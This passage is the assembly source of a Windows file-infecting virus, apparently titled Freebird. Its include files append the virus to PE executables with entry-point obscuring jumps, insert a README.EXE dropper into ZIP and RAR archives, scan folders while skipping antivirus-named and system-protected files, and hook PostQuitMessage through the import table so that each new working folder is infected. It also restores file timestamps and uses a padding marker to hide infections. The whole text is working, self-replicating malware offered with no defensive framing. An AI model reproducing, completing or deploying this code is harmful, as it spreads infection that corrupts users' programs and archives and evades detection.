        mov     ecx,FinRARHeader-RARHeader
        rep     movsb

        mov     esi,[wideBuffer+ebp]
        mov     ecx,[RAROriginal+ebp]
        rep     movsb

        push    dword [wideBuffer+ebp]
        call    dword [_UnmapViewOfFile+ebp]

        push    dword [wideBuffer+4+ebp]
        call    dword [_CloseHandle+ebp]

        push    dword [wideBuffer+8+ebp]
        call    dword [_CloseHandle+ebp]        ; dropper released

infectionErrorCloseUnmapRAR:
        push    dword [mapMem+ebp]
        call    dword [_UnmapViewOfFile+ebp]

infectionErrorCloseMapRAR:
        push    dword [fhmap+ebp]
        call    dword [_CloseHandle+ebp]

        lea     eax,[fileTime2+ebp]
        push    eax
        add     eax,-8
        push    eax
        add     eax,-8
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_SetFileTime+ebp]

infectionErrorCloseRAR:
        push    dword [fHnd+ebp]
        call    dword [_CloseHandle+ebp]

infectionErrorAttribRAR:
        pop     esi
        push    dword [fileAttrib+ebp]
        push    esi
        call    dword [_SetFileAttributesA+ebp]

infectionErrorRAR:
        ret

; adds the dropper to a ZIP archive pointed by esi
infectZIP:
        push    esi

        push    esi
        call    dword [_GetFileAttributesA+ebp]
        pop     esi
        inc     eax
        jz      near infectionErrorZIP
        dec     eax

        mov     dword [fileAttrib+ebp],eax

        push    esi
        push    dword 80h
        push    esi
        call    dword [_SetFileAttributesA+ebp]
        pop     esi
        or      eax,eax
        jz      near infectionErrorZIP

        push    esi

        xor     eax,eax
        push    eax
        push    dword 80h
        push    dword 3
        push    eax
        push    eax
        push    dword (80000000h | 40000000h)
        push    esi
        call    dword [_CreateFileA+ebp]
        inc     eax
        jz      near infectionErrorAttribZIP
        dec     eax

        mov     [fHnd+ebp],eax

        push    dword 0
        push    eax
        call    dword [_GetFileSize+ebp]
        inc     eax
        jz      near infectionErrorCloseZIP
        dec     eax

        mov     [fileSize+ebp],eax
        mov     [dummy+ebp],eax                 ; required later

        lea     eax,[fileTime2+ebp]
        push    eax
        add     eax,-8
        push    eax
        add     eax,-8
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_GetFileTime+ebp]
        or      eax,eax
        jz      near infectionErrorCloseZIP

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near infectionErrorCloseZIP

        mov     dword [fhmap+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap+ebp]
        call    dword [_MapViewOfFile+ebp]
        or      eax,eax
        jz      near infectionErrorCloseMapZIP

        mov     [mapMem+ebp],eax

        ; don't rely too much on next part XD
        ; using ZIP32 for tests

        add     eax,[fileSize+ebp]
        sub     eax,16h

        mov     edx,[eax]
        cmp     edx,06054b50h                   ; a ZIP archive?
        jne     near infectionErrorCloseMapZIP
        
        mov     edx,[eax+10h]                   ; already infected?
        add     edx,[mapMem+ebp]
        cmp     dword [edx+2eh],"READ"
        jne     notFoundZIP
        cmp     dword [edx+2eh+4],"ME.E"
        je      near infectionErrorCloseMapZIP

notFoundZIP:
        mov     cl,[edx+4]                      ; get some things from
        mov     [ZIPCver+ebp],cl                ; this entry to be less
        mov     cl,[edx+5]                      ; suspicious
        mov     [ZIPCos+ebp],cl
        mov     cx,[edx+0ch]
        mov     [ZIPCtim+ebp],cx
        mov     cx,[edx+0eh]
        mov     [ZIPCDat+ebp],cx
        mov     cl,[edx+06h]
        mov     [ZIPCvxt+ebp],cl
        mov     cl,[edx+07h]
        mov     [ZIPCeXos+ebp],cl

        ; now load our droper

        xor     eax,eax
        push    eax
        push    dword 00000007h
        push    dword 00000003h
        push    eax
        push    eax
        push    dword 80000000h
        lea     esi,[dropName+ebp]              ; our dropper
        push    esi
        call    dword [_CreateFileA+ebp]
        inc     eax
        jz      near infectionErrorCloseMapZIP
        dec     eax

        push    eax
        push    dword 0
        push    eax
        call    dword [_GetFileSize+ebp]
        pop     ebx
        inc     eax
        jz      near infectionErrorCloseMapZIP
        dec     eax

        add     [fileSize+ebp],eax              ; new size
        add     dword [fileSize+ebp],EndOfCentral-LocalHeader

        mov     [ZIPSize+ebp],eax               ; update ZIP header
        mov     [ZIPUncmp+ebp],eax
        mov     [ZIPCsiz+ebp],eax
        mov     [ZIPCunc+ebp],eax
        
        push    ebx

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 2
        push    eax
        push    ebx
        call    dword [_CreateFileMappingA+ebp]
        pop     ebx
        or      eax,eax
        jz      near infectionErrorCloseMapZIP

        push    ebx
        push    eax
        mov     ebx,eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    ebx
        call    dword [_MapViewOfFile+ebp]
        pop     edx
        pop     ebx
        or      eax,eax
        jz      near infectionErrorCloseMapZIP

        mov     [wideBuffer+ebp],eax            ; view of file
        mov     [wideBuffer+4+ebp],edx          ; file mapping
        mov     [wideBuffer+8+ebp],ebx          ; file handle

        mov     esi,eax                         ; get virus CRC32
        mov     edi,[ZIPSize+ebp]
        call    CRC32
        mov     [ZIPCCrc+ebp],eax
        mov     [ZIPCrc+ebp],eax

        xor     eax,eax
        push    eax
        push    dword [fileSize+ebp]
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near infectionErrorCloseZIP

        mov     [fhmap+ebp],eax

        xor     eax,eax
        push    dword [fileSize+ebp]
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap+ebp]
        call    dword [_MapViewOfFile+ebp]
        or      eax,eax
        jz      near infectionErrorCloseMapZIP

        mov     [mapMem+ebp],eax

        add     eax,[dummy+ebp]                 ; size of the old zip
        sub     eax,16h                         ; end header

        mov     ecx,[eax+0ch]                   ; size of central dir
        add     ecx,16h                         ; last header

        mov     esi,[mapMem+ebp]
        add     esi,[eax+10h]                   ; start of dir

        mov     edi,[mapMem+ebp]
        add     edi,[fileSize+ebp]
        sub     edi,ecx                         ; new address

        add     edi,ecx                         ; we must copy it
        add     esi,ecx                         ; reversed

        ; move the central dir
        dec     esi
        dec     edi
moveCentralDir:
        lodsb
        sub     esi,2
        stosb
        sub     edi,2
        dec     ecx
        jnz     moveCentralDir

        mov     eax,[mapMem+ebp]                ; new addres of the
        add     eax,[fileSize+ebp]              ; header
        sub     eax,16h

        ; now add our central entry

        mov     edi,[mapMem+ebp]
        mov     edx,[ZIPSize+ebp]
        add     edx,CentralHeader-LocalHeader
        add     [eax+10h],edx                   ; fix offset
        add     edi,[eax+10h]
        lea     esi,[CentralHeader+ebp]
        mov     ecx,EndOfCentral-CentralHeader
        rep     movsb                           ; add our central entry

        mov     esi,edi                         ; 1st non viral entry

        mov     ecx,EndOfCentral-CentralHeader
        add     [eax+0ch],ecx                   ; fix size
        inc     word [eax+0ah]                  ; one more entry
        inc     word [eax+08h]                  ; once again

        ; now fix the directories offsets
        movzx   ecx,word [eax+0ah]              ; num of entries
        dec     ecx                             ; skip viral one
        mov     ebx,[ZIPSize+ebp]
        add     ebx,CentralHeader-LocalHeader   ; increase len

fixZIPDirLoop:
        add     [esi+2ah],ebx                   ; fix offset
        mov     edx,2eh
        add     dx,[esi+1ch]
        add     dx,[esi+1eh]
        add     dx,[esi+20h]                    ; dir total size
        add     esi,edx
        loop    fixZIPDirLoop

        ; now process local entries
        mov     ebx,[ZIPSize+ebp]
        add     ebx,CentralHeader-LocalHeader
        mov     ecx,[eax+10h]                   ; offs central = local len
        sub     ecx,ebx
        mov     esi,[mapMem+ebp]                ; 1st local
        mov     edi,esi
        add     edi,ebx                         ; new local place

        add     esi,ecx                         ; goto end to move from
        add     edi,ecx                         ; bottom to top

        ; move local entries to its new place
        dec     esi
        dec     edi
moveLocalZIP:
        lodsb
        sub     esi,2
        stosb
        sub     edi,2
        dec     ecx
        jnz     moveLocalZIP

        mov     edi,[mapMem+ebp]
        lea     esi,[LocalHeader+ebp]
        mov     ecx,CentralHeader-LocalHeader
        rep     movsb                           ; copy our local header

        mov     ecx,[ZIPSize+ebp]
        mov     esi,[wideBuffer+ebp]
        rep     movsb                           ; and copy the dropper

        push    dword [wideBuffer+ebp]
        call    dword [_UnmapViewOfFile+ebp]

        push    dword [wideBuffer+4+ebp]
        call    dword [_CloseHandle+ebp]

        push    dword [wideBuffer+8+ebp]
        call    dword [_CloseHandle+ebp]        ; dropper released

infectionErrorCloseUnmapZIP:
        push    dword [mapMem+ebp]
        call    dword [_UnmapViewOfFile+ebp]

infectionErrorCloseMapZIP:
        push    dword [fhmap+ebp]
        call    dword [_CloseHandle+ebp]

        lea     eax,[fileTime2+ebp]
        push    eax
        add     eax,-8
        push    eax
        add     eax,-8
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_SetFileTime+ebp]

infectionErrorCloseZIP:
        push    dword [fHnd+ebp]
        call    dword [_CloseHandle+ebp]

infectionErrorAttribZIP:
        pop     esi
        push    dword [fileAttrib+ebp]
        push    esi
        call    dword [_SetFileAttributesA+ebp]

infectionErrorZIP:
        ret


; - archive.inc EOF -
; - findf.inc BOF -

;
; Simply scan current folder for files to infect
;
scandirpe:
        lea     eax,[finddata+ebp]
        push    eax
        lea     eax,[fmask+ebp]
        push    eax
        call    dword [_FindFirstFileA+ebp]
        inc     eax
        jz      near notFound
        dec     eax

        mov     dword [findHnd+ebp],eax

findNext:
        mov     eax,dword [nFileSizeLow+ebp]            ; avoid small files
        cmp     eax,4000h
        jb      near skipThisFile
        mov     ecx,PADDING                             ; avoid already
        xor     edx,edx                                 ; infected files
        div     ecx
        or      edx,edx
        jz      near skipThisFile

        lea     esi,[cFileName+ebp]

        call    isAV
        jc      near skipThisFile

        mov     eax,[_SfcIsFileProtected+ebp]           ; we have sfc?
        or      eax,eax
        jz      near sfcNotAvailable

        ; hehe i've noticed SfcIsFileProtected requires
        ; a wide string not the ansi one... shit
        ; moreover sfc only manages full path names :/
        ; i'm glad with win2000 to test all this things =]

        push    dword 260                               ; 260 wide chars
        lea     edi,[wideBuffer+ebp]
        push    edi                                     ; wide buffer
        xor     eax,eax
        dec     eax
        push    eax                                     ; -1 (zstring)
        push    esi                                     ; ANSI
        inc     eax
        push    eax                                     ; 0
        push    eax                                     ; CP_ACP == 0
        call    dword [_MultiByteToWideChar+ebp]
        or      eax,eax
        jz      skipThisFile                            ; damn

        lea     esi,[dummy+ebp]
        push    esi
        lea     esi,[wideBuffer2+ebp]
        push    esi
        push    dword 260
        lea     esi,[wideBuffer+ebp]
        push    esi
        call    dword [_GetFullPathNameW+ebp]
        or      eax,eax
        jz      skipThisFile                            ; damn (2)

        lea     esi,[wideBuffer2+ebp]
        push    esi
        push    dword 0
        call    dword [_SfcIsFileProtected+ebp]         ; check this file
        or      eax,eax
        jnz     skipThisFile

sfcNotAvailable:
        lea     esi,[cFileName+ebp]
        call    infectpe

skipThisFile:
        lea     eax,[finddata+ebp]
        push    eax
        push    dword [findHnd+ebp]
        call    dword [_FindNextFileA+ebp]
        or      eax,eax
        jnz     near findNext

endScan:
        push    dword [findHnd+ebp]
        call    dword [_FindClose+ebp]

notFound:
        ret

; make the ASCII string uppercase and look for some stringz usual in
; antiviral software to avoid infect them
isAV:
        push    esi
UCaseLoop:
        cmp     byte [esi],'a'
        jb      notUCase
        cmp     byte [esi],'z'
        ja      notUCase
        sub     byte [esi],'a'-'A'
notUCase:
        lodsb
        or      al,al
        jnz     UCaseLoop
        mov     esi,[esp]
avStrLoop:
        mov     ax,word [esi]
        not     ax
        cmp     ax,~'AV'
        je      itIsAV
        cmp     ax,~'DR'
        je      itIsAV
        cmp     ax,~'SP'
        je      itIsAV
        cmp     ax,~'F-'
        je      itIsAV
        cmp     ax,~'AN'
        je      itIsAV
        cmp     ax,~'VE'
        je      itIsAV
        cmp     ax,~'CL'
        je      itIsAV
        cmp     ax,~'ON'
        je      itIsAV
        not     ax
        inc     esi
        or      ah,ah
        jnz     avStrLoop

        clc
        mov     al,0f9h
itIsAV  equ $-1
        pop     esi
        ret

; - findf.inc EOF -
; - hooks.inc BOF -

hookmtx dd      0       ; mutex for multi-threading calls
hookDll db      "USER32",0
hookFc1 db      "PostQuitMessage",0
;
; Just check for directory changes and infect then all files there.
;
setupPerProcess:
        lea     eax,[hookDll+ebp]
        push    eax
        call    dword [_LoadLibraryA+ebp]
        or      eax,eax
        jz      failedToHook

        lea     esi,[hookFc1+ebp]
        push    esi
        push    eax
        call    dword [_GetProcAddress+ebp]

        mov     ecx,eax
        mov     [PostQuitMessageHA+ebp],eax
        lea     esi,[PostQuitMessageH+ebp]
        call    APIHook

        xor     eax,eax
        mov     [hookmtx+ebp],eax               ; hook ready
failedToHook:
        ret

;
; the hook
;
PostQuitMessageH:
        push    dword 12345678h
PostQuitMessageHA   equ $-4
        pushad                                  ; save all
        pushfd

        call    getDelta

        mov     eax,[hookmtx+ebp]               ; ready to infect?
        or      eax,eax
        jnz     hookFailed

        inc     dword [hookmtx+ebp]             ; do not disturb

        ; path0 has current work directory
        lea     esi,[path1+ebp]
        push    esi
        push    dword 260
        call    dword [_GetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      endHook

        mov     ecx,eax                         ; if we're still into
        lea     esi,[path0+ebp]                 ; the same folder, avoid
        lea     edi,[path1+ebp]                 ; infect more files
        rep     cmpsb
        je      endHook

        mov     ecx,eax                         ; update folder
        lea     esi,[path1+ebp]
        lea     edi,[path0+ebp]
        rep     movsb

        call    scandirpe                       ; infect new work
                                                ; folder
        call    findArchives

endHook:
        dec     dword [hookmtx+ebp]             ; ready again
hookFailed:
        popfd
        popad
        ret

;
; My nice (and old) API hook routine.
;
APIHook:
        push    esi
        mov     edx,[baseAddr+ebp]              ; remember to fix it after
                                                ; (probably) reloc!
        mov     edi,edx
        add     edi,[edx+3ch]                   ; begin PE header
        mov     edi,[edi+80h]                   ; RVA import
        or      edi,edi                         ; uh? no imports??? :)
        jz      near _skipHookErr
        add     edi,edx                         ; add base addr
_searchusrImp:
        mov     esi,[edi+0ch]                   ; get name
        or      esi,esi                         ; check is not last
        jz      _skipHookErr
        add     esi,edx                         ; add base addr
        mov     ebx,[esi]
        or      ebx,20202020h
        cmp     ebx,"user"                      ; look for module
        jne     _nextName
        mov     bx,[esi+4]
        cmp     bx,"32"                          ; module found
        je      _usrImpFound
_nextName:                                      ; if not found check
        add     edi,14h                         ; name of next import
        mov     esi,[edi]                       ; module
        or      esi,esi
        jz      _skipHookErr
        jmp     _searchusrImp
_usrImpFound:                                   ; now we have user32
        mov     esi,[edi+10h]                   ; get address table
        or      esi,esi                         ; heh
        jz      _skipHookErr
        add     esi,edx                         ; add base addr again

        mov     edi,ecx                         ; search for API
_nextImp:
        lodsd                                   ; get addrs
        or      eax,eax                         ; chek is not last
        jz      _skipHookErr
        cmp     eax,edi                         ; cmp with API addr
        je      _doHook                         ; found? hook!
        jmp     _nextImp                        ; check next in table
_doHook:
        sub     esi,4
        push    esi                             ; save import addr

        call    dword [_GetCurrentProcess+ebp]        

        pop     esi
        pop     edx
        mov     [fileSize+ebp],edx              ; tmp storage

        lea     edi,[padding+ebp]
        push    edi                             ; shit
        push    dword 4
        lea     edi,[fileSize+ebp]
        push    edi                             ; bytes to write
        push    esi                             ; where to write
        push    eax                             ; current process
        call    dword [_WriteProcessMemory+ebp]
_skipHook:
        ret
_skipHookErr:
        pop     esi
        xor     eax,eax
        ret

; - hooks.inc EOF -
; - infectpe.inc BOF -

; pretty standard padding value, the idea is several viruses use the
; same value to avoid av can use easy ways to manage them
PADDING equ     101

infectpe:
        push    esi

        push    esi
        call    dword [_GetFileAttributesA+ebp]
        pop     esi
        inc     eax
        jz      near infectionError
        dec     eax

        mov     dword [fileAttrib+ebp],eax

        push    esi
        push    dword 80h
        push    esi
        call    dword [_SetFileAttributesA+ebp]
        pop     esi
        or      eax,eax
        jz      near infectionError

        push    esi

        xor     eax,eax
        push    eax
        push    dword 80h
        push    dword 3
        push    eax
        push    eax
        push    dword (80000000h | 40000000h)
        push    esi
        call    dword [_CreateFileA+ebp]
        inc     eax
        jz      near infectionErrorAttrib
        dec     eax

        mov     [fHnd+ebp],eax

        push    dword 0
        push    eax
        call    dword [_GetFileSize+ebp]
        inc     eax
        jz      near infectionErrorClose
        dec     eax

        mov     [fileSize+ebp],eax

        lea     eax,[fileTime2+ebp]
        push    eax
        add     eax,-8
        push    eax
        add     eax,-8
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_GetFileTime+ebp]
        or      eax,eax
        jz      near infectionErrorClose

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near infectionErrorClose

        mov     dword [fhmap+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap+ebp]
        call    dword [_MapViewOfFile+ebp]
        or      eax,eax
        jz      near infectionErrorCloseMap

        mov     [mapMem+ebp],eax

        mov     edi,eax
        cmp     word [edi],'MZ'
        jne     near infectionErrorCloseUnmap

        add     edi,[edi+3ch]
        cmp     eax,edi
        jae     near infectionErrorCloseUnmap
        add     eax,[fileSize+ebp]
        cmp     eax,edi
        jbe     near infectionErrorCloseUnmap
        cmp     word [edi],'PE'
        jne     near infectionErrorCloseUnmap

        movzx   edx,word [edi+16h]
        test    edx,2h
        jz      near infectionErrorCloseUnmap
        test    edx,2000h
        jnz     near infectionErrorCloseUnmap
        mov     dx,[edi+5ch]
        dec     edx
        jz      near infectionErrorCloseUnmap

        mov     esi,edi
        mov     eax,18h
        add     ax,[edi+14h]
        add     edi,eax

        mov     cx,[esi+06h]
        dec     cx
        mov     eax,28h
        mul     cx
        add     edi,eax

        mov     eax,dword [esi+80h]             ; 1st we need just one
        or      eax,eax                         ; import from k32
        jz      near infectionErrorCloseUnmap

        call    rva2raw
        jc      near infectionErrorCloseUnmap

        add     eax,[mapMem+ebp]
        xchg    eax,edx
k32imploop:
        mov     eax,dword [edx+0ch]
        or      eax,eax
        jz      near infectionErrorCloseUnmap
        call    rva2raw
        jc      near infectionErrorCloseUnmap
        add     eax,[mapMem+ebp]
        mov     ebx,dword [eax]
        or      ebx,20202020h
        cmp     ebx,'kern'
        jne     nextImpMod
        mov     ebx,dword [eax+4]
        or      ebx,00002020h
        cmp     ebx,'el32'
        je      k32ImpFound
nextImpMod:
        add     edx,14h
        mov     eax,dword [edx]
        or      eax,eax
        jz      near infectionErrorCloseUnmap
        jmp     k32imploop
k32ImpFound:
        mov     eax,[edx+10h]
        or      eax,eax
        jz      near infectionErrorCloseUnmap
        mov     edx,eax
        call    rva2raw
        jc      near infectionErrorCloseUnmap
        add     eax,[mapMem+ebp]
        mov     eax,[eax]
        or      eax,eax
        jz      near infectionErrorCloseUnmap
        add     edx,[esi+34h]
        mov     [__imp__+ebp],edx               ; we got 1st import
                                                ; that will be used to
                                                ; get k32 addr in run-time
        mov     eax,[edi+14h]
        add     eax,[edi+10h]
        mov     [virusBeginRaw+ebp],eax

        mov     eax,[edi+0ch]                   ; sect rva
        add     eax,[edi+10h]                   ; sect raw size

        mov     [relocTMP+ebp],eax
        mov     ecx,[esi+34h]
        mov     [baseAddr+ebp],ecx
        add     [relocTMP+ebp],ecx

        mov     eax,[esi+28h]
        mov     [hostEPTMP+ebp],eax             ; reloc and EP ok, now EPO

        call    rva2raw
        jc      near infectionErrorCloseUnmap

        add     eax,[mapMem+ebp]

        ; we look for...
        ;
        ;       mov     [fs:00000000],esp
        ; or...
        ;
        ;       mov     esp,ebp
        ;       pop     ebp
        ;       ret
        ;       db      ffh,ffh,ffh,ffh
        ;       or      db 00h,00h,00h,00h
        ;
        ; and that's ok.
        ;
        push    eax

        mov     ecx,200h
checkNextAddr:
        inc     eax
        cmp     dword [eax],00258964h
        jne     addrNotFound0
        cmp     dword [eax+3],00000000h
        je      addrFound
addrNotFound0:
        cmp     dword [eax],0c35de58bh
        jne     addrNotFound1
        cmp     dword [eax+4],-1
        je      addrFound
        cmp     dword [eax+4],0
        je      addrFound
addrNotFound1:
        dec     ecx
        jnz     checkNextAddr
        pop     eax
        push    eax
addrFound:
        pop     edx

        sub     eax,edx
        mov     edx,eax
        add     edx,[esi+34h]
        add     eax,[hostEPTMP+ebp]
        add     [hostEPTMP+ebp],edx

        call    rva2raw
        jc      near infectionErrorCloseUnmap

        add     eax,[mapMem+ebp]

        push    esi
        push    edi
        mov     esi,eax
        push    esi
        lea     edi,[epobuffTMP+ebp]
        mov     ecx,5
        rep     movsb

        pop     edi
        mov     al,0e9h
        stosb
        mov     eax,[relocTMP+ebp]
        sub     eax,[hostEPTMP+ebp]
        sub     eax,5
        stosd

        pop     edi
        pop     esi

        xor     eax,eax
        mov     [esi+58h],eax

        or      dword [edi+24h],0c0000000h
        and     dword [edi+24h],~(02000000h | 10000000h)

        mov     eax,vSize
        add     eax,[edi+10h]                           ; raw size
        xor     edx,edx
        mov     ecx,[esi+3ch]
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     [edi+10h],eax                           ; size of raw data

        mov     eax,viSize
        add     eax,[edi+10h]                           ; virt size
        xor     edx,edx
        mov     ecx,[esi+38h]
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     [edi+08h],eax                           ; size of virt data

        add     eax,[edi+0ch]
        mov     [esi+50h],eax                           ; size of image

        mov     eax,[edi+10h]                           ; calc file size
        add     eax,[edi+14h]                           ; with padding
        mov     ecx,PADDING
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     [padding+ebp],eax

        push    dword [mapMem+ebp]
        call    dword [_UnmapViewOfFile+ebp]

        push    dword [fhmap+ebp]
        call    dword [_CloseHandle+ebp]

        xor     eax,eax
        push    eax
        push    dword [padding+ebp]
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near infectionErrorClose

        mov     [fhmap+ebp],eax

        xor     eax,eax
        push    dword [padding+ebp]
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap+ebp]
        call    dword [_MapViewOfFile+ebp]
        or      eax,eax
        jz      near infectionErrorCloseMap

        mov     [mapMem+ebp],eax

        pushad
        lea     esi,[vBegin+ebp]
        mov     edi,vSize-4
        call    CRC32
        mov     [myCRC32+ebp],eax
        popad

        mov     ecx,vSize
        lea     esi,[vBegin+ebp]
        mov     edi,12345678h
virusBeginRaw   equ $-4
        add     edi,eax
        rep     movsb

        mov     eax,dword [_CheckSumMappedFile+ebp]
        or      eax,eax
        jz      infectionErrorCloseUnmap

        lea     esi,[chksum+ebp]
        push    esi
        sub     esi,-4
        push    esi
        push    dword [padding+ebp]
        push    dword [mapMem+ebp]
        call    eax
        or      eax,eax
        jz      infectionErrorCloseUnmap

        mov     edx,dword [chksum+ebp]
        mov     dword [eax+58h],edx

infectionErrorCloseUnmap:
        push    dword [mapMem+ebp]
        call    dword [_UnmapViewOfFile+ebp]

infectionErrorCloseMap:
        push    dword [fhmap+ebp]
        call    dword [_CloseHandle+ebp]

        lea     eax,[fileTime2+ebp]
        push    eax
        add     eax,-8
        push    eax
        add     eax,-8
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_SetFileTime+ebp]

infectionErrorClose:
        push    dword [fHnd+ebp]
        call    dword [_CloseHandle+ebp]

infectionErrorAttrib:
        pop     esi
        push    dword [fileAttrib+ebp]
        push    esi
        call    dword [_SetFileAttributesA+ebp]

infectionError:
        ret

; ESI: PE header EAX: rva shit
; out EAX: raw
rva2raw:
        push    eax
        pushad
        mov     edx,esi
        mov     ecx,edx
        mov     esi,eax
        mov     eax,18h
        add     ax,[edx+14h]
        add     edx,eax
        movzx   ecx,word [ecx+06h]
        xor     ebp,ebp
rva2rawLoop:
        mov     edi,[edx+ebp+0ch]
        add     edi,[edx+ebp+8]
        cmp     esi,edi
        jb      foundDamnSect
nextSectPlz:
        add     ebp,28h
        loop    rva2rawLoop
        popad
        pop     eax
        stc
        ret
foundDamnSect:
        sub     esi,[edx+ebp+0ch]
        add     esi,[edx+ebp+14h]
        mov     dword [esp+20h],esi
        popad
        pop     eax
        clc
        ret

; - infectpe.inc EOF -
; END OF FREEBIRD.TXT

